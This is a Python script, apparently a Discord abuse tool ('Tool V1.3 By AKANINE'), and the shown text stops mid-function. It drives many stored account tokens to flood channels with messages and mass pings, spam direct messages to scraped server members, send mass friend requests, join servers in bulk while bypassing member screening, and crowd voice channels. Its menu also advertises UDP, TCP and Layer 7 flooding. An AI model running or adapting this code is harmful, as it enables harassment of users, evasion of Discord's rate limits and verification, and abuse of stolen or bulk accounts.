from ast import For
import os
from os import system
from statistics import mean

from requests.api import options

try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    from requests import get
except:
    os.system("pip install requests")
    from requests import get

import threading

try:
    import colorama
except:
    os.system("pip install colorama")
    import colorama

try:
    import discord
except:
    os.system("pip install discord")
    import discord

from discord.ext import commands

try:
    import pyautogui
except:
    os.system("pip install pyautogui")
    import pyautogui

import time
import re

try:
    import http.client
except:
    os.system('pip install python-http-client')
    import http.client

import random

try:
    import json
except:
    os.system('pip install json')
    import json


try:
    import base64
except:
    os.system('pip install base64')
    import base64

import string
import sys
from colorama import Fore

try:
    import emoji as ej
except:
    os.system('pip install emoji')
    import emoji as ej

try:
    import websocket
except:
    os.system('pip install websocket')
    import websocket

try:
    import asyncio
except:
    os.system('pip install asyncio')
    import asyncio

try:
    from bs4 import BeautifulSoup
except:
    os.system('pip install beautifulsoup4')
    from bs4 import BeautifulSoup

try:
    from webdriver_manager.chrome import ChromeDriverManager
except:
    os.system('pip install webdriver-manager')
    from webdriver_manager.chrome import ChromeDriverManager

try:
    from PIL import Image
except:
    os.system('pip install pillow')
    from PIL import Image

try:
    import discum
except:
    os.system('pip install discum')
    import discum

try:
    from selenium import webdriver
except:
    os.system('pip install selenium')
    from selenium import webdriver

ur = 'https://discord.com/api/v9/channels/messages'
title = 'ToolV1.3 By AKANINE '
system(f'title {title}')
tokens = open('tokens.txt', 'r').read().splitlines()


def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text


def mainHeader(token):
    return {
        "authorization": token,
        "accept": "*/*",
        'accept-encoding': 'gzip, deflate, br',
        "accept-language": "en-GB",
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }


def secondHeader(token):
    return {
        ':authority': 'discord.com',
        ':method': 'PATCH',
        ':path': '/api/v9/users/@me',
        ':scheme': 'https',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US',
        'authorization': token,
        'content-length': '124',
        'content-type': 'application/json',
        'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        'origin': 'https://canary.discord.com',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.616 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MTYiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjQ1OCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5ODgyMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}

import httpx,threading,os
from threading import Thread
from random import choice
from os import system
import cloudscraper
import socket
import socket
import colorama
from colorama import Fore, init
import os 
import threading
import time
import requests,time
import threading, os, colorama, time
from requests import Session
from threading import Thread
from re import search
from colorama import Fore, init
from colorama import Back as bg
from requests import get
import random
from json import loads
from time import sleep
from json import dumps
from websocket import WebSocket
from concurrent.futures import ThreadPoolExecutor
import webbrowser
import os
import sys
from requests import Session,post,get
from re import search
from concurrent.futures import ThreadPoolExecutor 
from time import sleep
import json as js2,threading
import websocket
import subprocess
import requests
import time
import requests
from dhooks import Webhook
from operator import truediv

print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTGREEN_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}{Fore.LIGHTBLUE_EX} Welcome To Tool V1.3{Fore.RESET} {Fore.LIGHTYELLOW_EX}Make By {Fore.RED}AKANINE{Fore.RESET}")
time.sleep(1)

def manu():
    asc = asyncio.get_event_loop()
    tokens = open('tokens.txt', 'r').read().splitlines()
    clear = lambda: os.system('cls')
    clear()

    init(convert=True)
    textcol = f"{Fore.BLACK}"

    print(f"""                             +  \88\               /80/  +
                               + \88\             /88/ +
    {Fore.BLUE}[{Fore.RED}+{Fore.BLUE}]{Fore.LIGHTYELLOW_EX} Tool V1.3{Fore.RESET}                +\88\           /12/+
    {Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.LIGHTYELLOW_EX}HWID Successful{Fore.RESET}            \889         /12/
                                     1010101111133
                                      * \80800/ *           {Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTMAGENTA_EX}]{Fore.LIGHTGREEN_EX} Tool {Fore.LIGHTRED_EX}V1.3 By {Fore.LIGHTMAGENTA_EX}AKANINE{Fore.RESET}
                                         |110|
                                        \ 233 /
                                         \___/



   {Fore.LIGHTMAGENTA_EX}[1] Spammer {Fore.RESET}           {Fore.LIGHTCYAN_EX}[11] UDP FLOOD                                                                                
   {Fore.LIGHTBLUE_EX}[2] Voice Spam Live {Fore.RESET}        {Fore.LIGHTYELLOW_EX}[12] TCP FLOOD                                                  
   {Fore.LIGHTGREEN_EX}[3] Dm Spammer {Fore.RESET}        {Fore.LIGHTRED_EX}[13] Layer 7 Tool                              
   {Fore.LIGHTRED_EX}[4] Friend Spammer {Fore.RESET}    {Fore.LIGHTCYAN_EX}[14] WebHook Spam Messag
   {Fore.LIGHTCYAN_EX}[5] Mass DM {Fore.RESET}           {Fore.LIGHTRED_EX}[15] WebHook Deleter
   {Fore.LIGHTBLUE_EX}[6] Joiner {Fore.RESET}            {Fore.LIGHTBLUE_EX}[16] Discord Cloner
   {Fore.LIGHTCYAN_EX}[7] Leaver {Fore.RESET}            {Fore.LIGHTYELLOW_EX}[17] Sms Spammer 
   {Fore.LIGHTMAGENTA_EX}[8] Token Checker {Fore.RESET}
   {Fore.LIGHTMAGENTA_EX}[9] Token Onliner {Fore.RESET}
   {Fore.LIGHTBLUE_EX}[10] Ping Voice chat {Fore.RESET}                           
                                                                                                                                                                                                                                   """)

    akamata = input(f'{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}+{Fore.LIGHTMAGENTA_EX}]{Fore.LIGHTYELLOW_EX} Choose>')

    if akamata == '1':
        tokens = open("tokens.txt", "r").read().splitlines()
        server = input(f'Server ID: ')
        channel = input(f'Chanel ID: ')
        mess = input(f'Message: ')
        delay = float(input(f'Delay: '))
        ch = input('Do you want append random string: y/n?: ').lower()
        mas = input('MassPing y/n?: ').lower()

        if mas == 'y':
            with open("tokens.txt") as f:
                firstline = f.readline().rstrip()
            bot = discum.Client(token=firstline)

            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    print(str(lenmembersfetched) + ' members fetched')
                    bot.gateway.removeCommand(
                        {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                    bot.gateway.close()

            def get_members(guild_id, channel_id):
                bot.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
                bot.gateway.command(
                    {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(server, channel)
            memberslist = []

            for memberID in members:
                memberslist.append(memberID)
                print(memberID)

            f = open('staff/users.txt', "w")
            for element in memberslist:
                f.write(f'<@{element}>' + '\n')
            f.close()

        def spam(token, mess):
            if mas == 'y':
                with open("staff/users.txt", "r") as file:
                    allText = file.read()
                    words = list(map(str, allText.split()))
                    mess += ''.join(random.choice(words))

            if ch == 'y':
                mess += " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))

            elif ch == 'n':
                pass

            else:
                pass

            url = 'https://discord.com/api/v9/channels/' + channel + '/messages'
            payload = {"content": mess, "tts": False}
            header = mainHeader(token)

            while True:
                time.sleep(delay)
                src = requests.post(url, headers=header, json=payload)

                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
                          str(float(ratelimit['retry_after'])) + " seconds")
                    time.sleep(float(ratelimit['retry_after']))

                elif src.status_code == 200:
                    print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{mess} sent')

                elif src.status_code == 401:
                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token')
                elif src.status_code == 404:
                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Not found ¯\_(ツ)_/¯')
                elif src.status_code == 403:
                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Token havent got access to this channel')

        def thread():
            text = mess
            for token in tokens:
                threading.Thread(target=spam, args=(token, text)).start()

        start = input(f'Press Enter to proceed: ')
        start = thread()

        time.sleep(5)
        exit = input(f'press any key: ')
        clear()
        exit = manu()

    if akamata == '2':
        guild_id = input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} GUILD ID: ")
        chid = input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} CHANNEL ID: ")
        tokenlist = open("tokens.txt").read().splitlines()
        executor = ThreadPoolExecutor(max_workers=int(1000000))

        def stop():
            dumps({"op": 1,"d": {}})
            dumps({"op": 5,"d": {}})

        def run(token):
            ws = WebSocket()
            ws.connect("wss://gateway.discord.gg/?v=8&encoding=json")
            first = loads(ws.recv())
            ws.send(dumps({"op": 2,"d": {"token": token,"properties": {"$os": "windows","$browser": "Discord","$device": "desktop"}}}))
            ws.send(dumps({"op": 4,"d": {"guild_id": guild_id,"channel_id": chid,"self_mute": True,"self_deaf": True}}))
            time.sleep(1)
            ws.send(dumps({"op": 18,"d": {"type": "guild","guild_id": guild_id,"channel_id": chid,"preferred_region": "singapore"}}))
            while truediv:
                time.sleep(first['d']['heartbeat_interval'] / 1000)
                try:
                    ws.send(dumps({"op": 1,"d": None}))
                except Exception:
                    break

        i = 0
        for token in tokenlist:
            executor.submit(run, token)
            i += 1
            print("connected ws : {}".format(i))

        ip = input("Exit  y/n :")

        if ip == 'y':
            stop()
        elif ip == 'n':
            os.system(exit)

    if akamata == '3':
        def DMSpammer(idd, message, token):
            header = mainHeader(token)

            payload = {'recipient_id': idd}
            r1 = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=header,
                               json=payload)

            if chrr == 'y':
                message += " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
            elif chrr == 'n':
                pass
            else:
                pass

            payload = {"content": message, "tts": False}
            j = json.loads(r1.content)

            while True:
                r2 = requests.post(f"https://discord.com/api/v9/channels/{j['id']}/messages",
                                   headers=header, json=payload)

                if r2.status_code == 429:
                    ratelimit = json.loads(r2.content)
                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
                          str(float(ratelimit['retry_after'])) + " seconds")
                    time.sleep(float(ratelimit['retry_after']))

                elif r2.status_code == 200:
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}DM sent to {idd}!")

        tokens = open("tokens.txt", "r").read().splitlines()
        user = input(f"User ID: ")
        message = input(f"Message: ")
        delay = int(input('Delay: '))
        chrr = input('Do you want append random string: y/n?: ').lower()


        def thread():
            for token in tokens:
                time.sleep(delay)
                threading.Thread(target=DMSpammer, args=(user, message, token)).start()

        start = input(f'Press enter to start: ')
        start = thread()

        time.sleep(5)
        exit = input(f'Press Enter to proceed: ')
        exit = clear()
        exit = manu()

    if akamata == '4':
        def friender(token, user):
            try:
                user = user.split("#")
                headers = mainHeader(token)
                payload = {"username": user[0], "discriminator": user[1]}
                src = requests.post('https://discord.com/api/v9/users/@me/relationships', headers=headers,
                                    json=payload)
                if src.status_code == 204:
                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Friend request sent to {user[0]}#{user[1]}! ")
            except Exception as e:
                print(e)

        user = input(f"Username + Tag: ")
        tokens = open("tokens.txt", "r").read().splitlines()
        delay = float(input(f'Delay: '))
        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=friender, args=(token, user)).start()

        time.sleep(5)
        exit = input(f'Press Enter to proceed:')
        exit = clear()
        exit = manu()

    if akamata == '5':
        print(
            f'{Fore.LIGHTRED_EX}[!] Warning!!!{Fore.RESET} Its a high chance to lock your tokens or token using this tool... recommended phone veryfied accounts')
        time.sleep(2)
        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Tokens DmSpammer')
        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Account DmSpammer')
        akalomeo = input('Input >')

        server = input(f'Server ID: ')
        channel = input(f'Chanel ID: ')

        if akalomeo == '1':
            with open("tokens.txt") as f:
                firstline = f.readline().rstrip()
            bot = discum.Client(token=firstline)

            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    print(str(lenmembersfetched) + ' members fetched')
                    bot.gateway.removeCommand(
                        {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                    bot.gateway.close()

            def get_members(guild_id, channel_id):
                bot.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
                bot.gateway.command(
                    {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(server, channel)
            memberslist = []

            for memberID in members:
                memberslist.append(memberID)
                print(memberID)

            f = open('staff/massdm_IDs.txt', "w")
            for element in memberslist:
                f.write(f'{element}' + '\n')
            f.close()

            print(f'{Fore.LIGHTRED_EX}Scraping members now{Fore.RESET}')
            time.sleep(2)

            file = open("staff/massdm_IDs.txt", "r")
            Counter = 0

            Content = file.read()
            CoList = Content.split("\n")

            for i in CoList:
                if i:
                    Counter += 1

            file2 = open("tokens.txt", "r")
            Counter2 = 0

            Content2 = file2.read()
            CoList2 = Content2.split("\n")

            for i in CoList2:
                if i:
                    Counter2 += 1

            time.sleep(2)

            print(f'There are {Counter} members')

            amountt = int(input('How many members do you wanna DM: '))
            realamountt = int(amountt / Counter2)

            tokens = open("tokens.txt", "r").read().splitlines()
            message = input('Message: ')

            def dmserver_spam():
                opened_dms = 0
                try:
                    for token in tokens:
                        for i in range(realamountt):
                            with open("staff/massdm_IDs.txt", "r") as file:
                                allText = file.read()
                                words = list(map(str, allText.split()))
                                idd = random.choice(words)

                            header = mainHeader(token)
                            header2 = {
                            'authority': 'discord.com',
                            'method': 'POST',
                            'path': '/api/v9/users/@me/channels',
                            'scheme': 'https',
                            "authorization": token,
                            "accept": "*/*",
                            "accept-language": "en-GB",
                            "content-length": "90",
                            "content-type": "application/json",
                            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                            "origin": "https://discord.com",
                            'referer': 'https://discord.com/channels/@me',
                            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': "Windows",
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin",
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'x-context-properties': 'e30=',
                            "x-debug-options": "bugReporterEnabled",
                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                        }

                            payload = {'recipient_id': idd}
                            r1 = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=header2,
                                               json=payload)

                            payload = {"content": message, "tts": False}
                            j = json.loads(r1.content)

                            r2 = requests.post(f"https://discord.com/api/v9/channels/{j['id']}/messages",
                                               headers=header, json=payload)

                            if r2.status_code == 429:
                                ratelimit = json.loads(r2.content)
                                print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
                                      str(float(ratelimit['retry_after'])) + " seconds")
                                time.sleep(float(ratelimit['retry_after']))

                            if r1.status_code == 429:
                                ratelimit = json.loads(r1.content)
                                print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
                                      str(float(ratelimit['retry_after'])) + " seconds")
                                time.sleep(float(ratelimit['retry_after']))

                            elif r2.status_code == 200:
                                print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}DM sent to {idd}!")

                            opened_dms += 1

                except:
                    print(f'{Fore.LIGHTRED_EX}Token is locked or some error...{Fore.RESET}')

            dmserver_spam()


        elif akalomeo == '2':
            tokens = input('Account token: ')
            messaage = input('Message: ')

            bot = discum.Client(token=tokens)

            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    print(str(lenmembersfetched) + ' members fetched')
                    bot.gateway.removeCommand(
                        {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                    bot.gateway.close()

            def get_members(guild_id, channel_id):
                bot.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
                bot.gateway.command(
                    {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(server, channel)
            memberslist = []

            for memberID in members:
                memberslist.append(memberID)
                print(memberID)

            f = open('staff/massdm_IDs.txt', "w")
            for element in memberslist:
                f.write(f'{element}' + '\n')
            f.close()

            file = open("staff/massdm_IDs.txt", "r")
            Counter = 0

            Content = file.read()
            CoList = Content.split("\n")

            for i in CoList:
                if i:
                    Counter += 1

            time.sleep(2)

            print(f'There are {Counter} members')
            amountt = int(input('How many members do you wanna DM: '))

            def dmspamre():
                try:
                    for i in range(amountt):
                        with open("staff/massdm_IDs.txt", "r") as file:
                            allText = file.read()
                            words = list(map(str, allText.split()))
                            idd = random.choice(words)

                        header = mainHeader(tokens)

                        headers = {
                            'authority': 'discord.com',
                            'method': 'POST',
                            'path': '/api/v9/users/@me/channels',
                            'scheme': 'https',
                            "authorization": tokens,
                            "accept": "*/*",
                            "accept-language": "en-GB",
                            "content-length": "90",
                            "content-type": "application/json",
                            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                            "origin": "https://discord.com",
                            'referer': 'https://discord.com/channels/@me',
                            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': "Windows",
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin",
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'x-context-properties': 'e30=',
                            "x-debug-options": "bugReporterEnabled",
                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                        }

                        payload = {'recipient_id': idd}
                        r1 = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=headers,
                                           json=payload)

                        payload = {"content": messaage, "tts": False}
                        j = json.loads(r1.content)

                        r2 = requests.post(f"https://discord.com/api/v9/channels/{j['id']}/messages",
                                           headers=header, json=payload)

                        if r2.status_code == 429:
                            ratelimit = json.loads(r2.content)
                            print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
                                  str(float(ratelimit['retry_after'])) + " seconds")
                            time.sleep(float(ratelimit['retry_after']))

                        if r1.status_code == 429:
                            ratelimit = json.loads(r1.content)
                            print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
                                  str(float(ratelimit['retry_after'])) + " seconds")
                            time.sleep(float(ratelimit['retry_after']))

                        elif r2.status_code == 200:
                            print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}DM sent to {idd}!")
                        continue

                except:
                    print(f'{Fore.LIGHTRED_EX}Token is locked or some error...{Fore.RESET}')
                    dmspamre()
            dmspamre()
    if akamata == '6':
        http.client._is_legal_header_name = re.compile(rb'[^\s][^:\r\n]*').fullmatch

        tokens = open("tokens.txt", "r").read().splitlines()

        def join(invite, token):
            token = token.replace("\r", "")
            token = token.replace("\n", "")
            headers = {
                ":authority": "discord.com",
                ":method": "POST",
                ":path": "/api/v9/invites/" + invite,
                ":scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": token,
                "content-length": "0",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                'referer': 'https://discord.com/channels/@me',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            }
            rrr = requests.post("https://discord.com/api/v9/invites/" + invite, headers=headers)
            if rrr.status_code == 204 or 200:
                print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET} Done')
            else:
                print('Error...')

        invite = input(f"Discord server invite: ")
        invite = invite.replace("https://discord.gg/", "")
        invite = invite.replace("discord.gg/", "")
        invite = invite.replace("https://discord.com/invite/", "")

        delay = float(input(f'Delay: '))

        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=join, args=(invite, token)).start()

        time.sleep(3)

        b = input('Do you want to bypass member screening y/n?: ')

        if b == 'y':
            def bpss(invite_code, serverId, token):
                headers = {
                    'Content-Type': 'application/json',
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US',
                    'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                    'DNT': '1',
                    'origin': 'https://discord.com',
                    'TE': 'Trailers',
                    'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                    'authorization': token,
                    'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}
                bpsur = f"https://discord.com/api/v9/guilds/{serverId}/member-verification?with_guild=false&invite_code=" + invite_code
                r1 = requests.get(bpsur, headers=headers).json()
                data = {}
                data['version'] = r1['version']
                data['form_fields'] = r1['form_fields']
                data['form_fields'][0]['response'] = True
                req = f"https://discord.com/api/v9/guilds/{str(serverId)}/requests/@me"
                requests.put(req, headers=headers, json=data)

            serverId = input('Server ID: ')
            tokens = open('tokens.txt', 'r').read().splitlines()
            for token in tokens:
                threading.Thread(target=bpss, args=(invite, serverId, token)).start()

        elif b == 'n':
            pass

        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET} Done')

        time.sleep(5)
        exit = input(f'press any key: ')
        exit = clear()
        exit = manu()
    
    if akamata == '7':
        token = open("tokens.txt", "r").read().splitlines()

        ID = input(f'Discord Server ID: ')

        apilink = "https://discord.com/api/v9/users/@me/guilds/" + str(ID)

        with open('tokens.txt', 'r') as handle:
            tokens = handle.readlines()
            for i in tokens:
                token = i.rstrip()
                headers = {
                    'Authorization': token,
                    "content-length": "0",
                    "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                    "origin": "https://discord.com",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                    "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="

                }
                requests.delete(apilink, headers=headers)
            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')

        time.sleep(5)
        exit = input(f'press any key: ')
        exit = clear()
        exit = manu()


    if akamata == '8':
        def filter_tokens(unfiltered):
            tokens = []
            for line in [x.strip() for x in unfiltered.readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        if token not in tokens:
                            tokens.append(token)

            return tokens

        def checker(token):
            response = get(f'https://discordapp.com/api/v9/users/@me/library',
                           headers={'Authorization': token})
            if "You need to verify your account in order to perform this action." in str(
                    response.content) or "401: Unauthorized" in str(response.content):
                return False
            elif response.status_code == 401:
                return 'Invalid'
            else:
                return True

        def manager():
            if __name__ == "__main__":
                try:
                    checked = []
                    with open('tokens.txt', 'r') as tokens:
